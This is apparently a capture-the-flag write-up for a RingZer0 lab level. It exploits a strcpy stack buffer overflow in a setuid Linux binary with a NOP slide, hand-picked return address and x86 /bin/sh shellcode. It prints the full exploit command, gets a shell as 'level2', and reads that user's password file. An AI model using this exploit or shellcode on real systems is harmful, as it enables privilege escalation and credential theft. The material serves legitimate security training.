Challenge From: `https://ringzer0ctf.com/challenges/80`

We have an executable on a linux machine. Looking at it's source code (level1.c), it has a 1024 bytes long buffer. It takes input from the user and stores in the buffer.  
This uses strcpy and thus does not check the length of the string it copies and it vulnerable to a Buffer Overflow via Reverse Engineering it.  
Our goal it to get a shell as the user "***level2***".   
Let's enter some input into the binary and see how it responds.

    $ ./level1 $(python -c "print('A'*1036)")
    Segmentation fault

There is Segmentation fault when entering 1036 chars.  
Let's use ***gdb*** to debug the binary and look at the memory addresses.

    (gdb) run $(python -c "print('A'*1036)")
    The program being debugged has been started already.
    Start it from the beginning? (y or n) y
    Starting program: /levels/level1 $(python -c "print('A'*1036)")

    Program received signal SIGSEGV, Segmentation fault.
    0xb7dfde00 in __libc_start_main (main=0x804841c <main>, argc=2, argv=0xbffff8b4, 
        init=0x8048460 <__libc_csu_init>, fini=0x8048450 <__libc_csu_fini>, 
        rtld_fini=0xb7fe5230 <_dl_fini>, stack_end=0xbffff8ac) at ../csu/libc-start.c:295
    295     ../csu/libc-start.c: No such file or directory.

<!-- 0xb7dfde00 - The value in the stack pointer-->

Looking at the stack pointer, it is at ***0xbffff810***.

    (gdb) p $sp
    $1 = (void *) 0xbffff810

Our plan it to insert an "malicious" code in to the buffer, and at the end of it will be a return address that points to the start of the malicious code. The problem is we don't know exactly where the memory address of the code will begin, because things move around and it is not always the same address.  
What we can do is use the ***NOP*** (No Operation) character ***/x90***. Whenever the program goes over this character, it will do nothing until reaching a different character, this is called a NOP slide.  

Let's find a memory address that points to the middle of the NOP slide.

    0xbffff9c4:     0x00000000      0x92000000      0x532d154b      0xc2821d13
    0xbffff9d4:     0x6d34eab8      0x69018f91      0x00363836      0x00000000
    0xbffff9e4:     0x6c2f0000      0x6c657665      0x656c2f73      0x316c6576
    0xbffff9f4:     0x41414100      0x41414141      0x41414141      0x41414141
    0xbffffa04:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffffa14:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffffa24:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffffa34:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffffa44:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffffa54:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffffa64:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffffa74:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffffa84:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffffa94:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffffaa4:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffffab4:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffffac4:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffffad4:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffffae4:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffffaf4:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffffb04:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffffb14:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffffb24:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffffb34:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffffb44:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffffb54:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffffb64:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffffb74:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffffb84:     0x41414141      0x41414141      0x41414141      0x41414141

***0xbffffb54*** seems good.  
Now all we need is the code itself and to build the exploit.  
I tried other shell codes but for some reason only this one worked.

    \x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68

The program crashes at 1036 bytes and the length of the shellcode is 46 bytes, that means the NOP slide length should be 990 bytes long. Only one more thing before we can craft it, the return address should be entered in reverse order of the bytes, because this machine is running little endian, so our exploit would look like this:

    NOP slide - \x90'*990 + 
    Payload - '\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68' + 
    Address in middle of NOP slide - '\x54\xfb\xff\xbf'

Let's run it and see if it works.

    $ ./level1 $(python -c "print('\x90'*990 + '\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68' + '\x54\xfb\xff\xbf')")
    $ id -a
    uid=1001(level2) gid=1001(level1) groups=1001(level1),1000(challenger)

We successfully have access to the user ***"level2"***, let's get his password from his home directory.

    $ cd /home/level2
    $ cat .pass
    TJyK9lJwZrgqc8nIIF6o
